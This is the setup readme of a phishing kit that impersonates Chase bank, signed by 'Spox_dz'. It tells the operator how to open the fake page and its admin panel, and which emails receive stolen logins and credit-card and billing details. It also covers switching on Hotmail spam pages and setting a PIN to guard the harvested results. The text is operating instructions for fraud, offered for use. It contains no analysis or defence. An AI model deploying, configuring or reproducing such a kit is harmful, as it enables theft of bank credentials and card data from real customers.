/**
 * DO NOT SELL THIS SCRIPT ! 
 * DO NOT CHANGE COPYRIGHT !
 * Chase -
 * version 3.0
 * icq & telegram = @spoxcoder
 
###############################################
#$            C0d3d by Spox_dz               $#
#$   Recording doesn't  make you a Coder     $#
#$          Copyright 2020 Chase             $#
###############################################

**/






Hello bro i'm spox i will show you how to setup this page :

To Open the page : yourdomain.com/?id=chase
To Open Admin Panel : yourdomain.com/admin=?id=spox

to edit setting:
Go to admin/YOUR-CONFIG.php

// SPAM INFO

first email : to receive logs and access email.
second email : to receive billing and cc details.

//ADMIN LOGIN INFO

You can change Username & Password to login to panel.
You can change redirect name also like ?id=chase 


On & Off  : 

If you spam only hotmail turn on hotmail page "yes"
if you spam all emails turn off hotmail spam .

Change Pin number for text result so no one can access your text result :) 




























/**
 * DO NOT SELL THIS SCRIPT ! 
 * DO NOT CHANGE COPYRIGHT !
 * Chase -
 * version 3.0
 * icq & telegram = @spoxcoder
 
###############################################
#$            C0d3d by Spox_dz               $#
#$   Recording doesn't  make you a Coder     $#
#$          Copyright 2020 Chase             $#
###############################################

**/